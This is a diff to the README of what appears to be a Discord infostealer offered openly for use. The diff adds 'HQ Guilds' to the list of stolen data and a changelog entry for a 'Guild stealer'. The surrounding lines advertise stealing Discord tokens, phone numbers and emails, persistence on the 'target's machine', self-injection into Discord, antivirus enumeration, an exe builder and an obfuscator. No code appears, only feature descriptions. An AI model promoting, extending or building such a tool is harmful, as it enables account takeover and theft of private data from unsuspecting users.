@@ -38,7 +38,7 @@
 
 💻 - Startup Running: Starts up whenever the target's machine does
 
-👥 - Private Information Stealer: Grabs Discord token, phone number, email, username and global username and HQ friends 
+👥 - Private Information Stealer: Grabs Discord token, phone number, email, username and global username and HQ friends, HQ Guilds
 
 📥 - Discord Injection: Self-injects into Discord
 
@@ -53,6 +53,7 @@
 
 ## <a id="changelog"></a>📝・Changelog
 ```
+- V3.8.5 Added Guild stealer and some fixes
 - V3.8.1 Removed and added some stuff
 - V3.8 Antivirus stealer (get all installed AVs) Builder with exe and new obfuscator.py and added Brave to the history stealer
 - V3.7.5 Added antivirus stealer 
